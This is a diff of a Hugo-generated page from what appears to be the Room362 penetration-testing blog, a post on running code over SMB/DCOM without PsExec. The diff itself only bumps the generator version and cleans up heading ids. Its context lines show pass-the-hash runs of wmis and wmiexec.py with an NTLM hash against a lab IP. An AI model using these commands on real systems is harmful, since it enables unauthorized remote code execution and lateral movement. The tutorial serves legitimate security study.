@@ -5,7 +5,7 @@
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="">
-  <meta name="generator" content="Hugo 0.15" />
+  <meta name="generator" content="Hugo 0.16" />
 
   <title>Executing code via SMB / DCOM without PSEXEC &middot; Room362</title>
 
@@ -245,9 +245,9 @@
 
 <p>Enough crazy talk here is an example usage of each:</p>
 
-<h2 id="wmis:abe7c5185ac892f91d8062f553410080">WMIS</h2>
+<h2 id="wmis">WMIS</h2>
 
-<h3 id="usage:abe7c5185ac892f91d8062f553410080">Usage:</h3>
+<h3 id="usage">Usage:</h3>
 
 <pre><code>root@wpad:~# wmis
 Usage: [-?NPV] [-?|--help] [--usage] [-d|--debuglevel=DEBUGLEVEL] [--debug-stderr] [-s|--configfile=CONFIGFILE]
@@ -262,7 +262,7 @@ Usage: [-?NPV] [-?|--help] [--usage] [-d|--debuglevel=DEBUGLEVEL] [--debug-stder
 Example: wmis -U [domain/]adminuser%password //host cmd.exe /c dir c:\ &gt; c:\windows\temp\output.txt 
 </code></pre>
 
-<h2 id="example:abe7c5185ac892f91d8062f553410080">Example:</h2>
+<h2 id="example">Example:</h2>
 
 <pre><code>root@wpad:~# wmis -U administrator%aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 //172.16.102.141 calc.exe
 HASH PASS: Substituting user supplied NTLM HASH...
@@ -271,11 +271,11 @@ HASH PASS: Substituting user supplied NTLM HASH...
 NTSTATUS: NT_STATUS_OK - Success
 </code></pre>
 
-<h2 id="wmiexec-py:abe7c5185ac892f91d8062f553410080">wmiexec.py</h2>
+<h2 id="wmiexec-py">wmiexec.py</h2>
 
 <p>Using a password, but with hashes you just tell it <code>-hashes</code> :</p>
 
-<h3 id="usage-1:abe7c5185ac892f91d8062f553410080">Usage:</h3>
+<h3 id="usage-1">Usage:</h3>
 
 <pre><code>root@wpad:~/impacket/examples# ./wmiexec.py 
 Impacket v0.9.12-dev - Copyright 2002-2014 Core Security Technologies
@@ -301,7 +301,7 @@ authentication:
 
 </code></pre>
 
-<h3 id="example-1:abe7c5185ac892f91d8062f553410080">Example:</h3>
+<h3 id="example-1">Example:</h3>
 
 <pre><code>root@wpad:~/impacket/examples# ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 administrator@172.16.102.141
 Impacket v0.9.12-dev - Copyright 2002-2014 Core Security Technologies
